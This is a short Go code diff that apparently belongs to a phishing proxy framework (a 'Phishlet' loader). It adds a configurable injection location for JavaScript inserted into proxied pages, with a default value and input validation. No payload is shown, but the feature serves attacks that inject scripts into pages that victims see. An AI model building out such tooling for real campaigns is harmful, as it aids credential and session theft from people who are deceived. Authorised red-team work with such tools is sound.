@@ -95,6 +95,7 @@ type JsInject struct {
 	trigger_paths   []*regexp.Regexp `mapstructure:"trigger_paths"`
 	trigger_params  []string         `mapstructure:"trigger_params"`
 	script          string           `mapstructure:"script"`
+	location        string           `mapstructure:"location"` // "head", "body_top", "body_bottom" (default: "body_bottom")
 }
 
 type Intercept struct {
@@ -209,6 +210,7 @@ type ConfigJsInject struct {
 	TriggerPaths   *[]string `mapstructure:"trigger_paths"`
 	TriggerParams  []string  `mapstructure:"trigger_params"`
 	Script         *string   `mapstructure:"script"`
+	Location       *string   `mapstructure:"location"` // "head", "body_top", "body_bottom"
 }
 
 type ConfigIntercept struct {
@@ -484,7 +486,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			for n := range *js.TriggerPaths {
 				(*js.TriggerPaths)[n] = p.paramVal((*js.TriggerPaths)[n])
 			}
-			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script))
+			location := "body_bottom" // default
+			if js.Location != nil {
+				location = *js.Location
+			}
+			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script), location)
 			if err != nil {
 				return err
 			}
@@ -989,9 +995,16 @@ func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, h
 	return nil
 }
 
-func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string, trigger_params []string, script string) error {
+func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string, trigger_params []string, script string, location string) error {
+	// Validate location
+	validLocations := []string{"head", "body_top", "body_bottom"}
+	if !stringExists(location, validLocations) {
+		return fmt.Errorf("js_inject: invalid location '%s'. valid options: %v", location, validLocations)
+	}
+	
 	js := JsInject{
-		id: GenRandomToken(),
+		id:       GenRandomToken(),
+		location: location,
 	}
 	for _, d := range trigger_domains {
 		js.trigger_domains = append(js.trigger_domains, strings.ToLower(d))
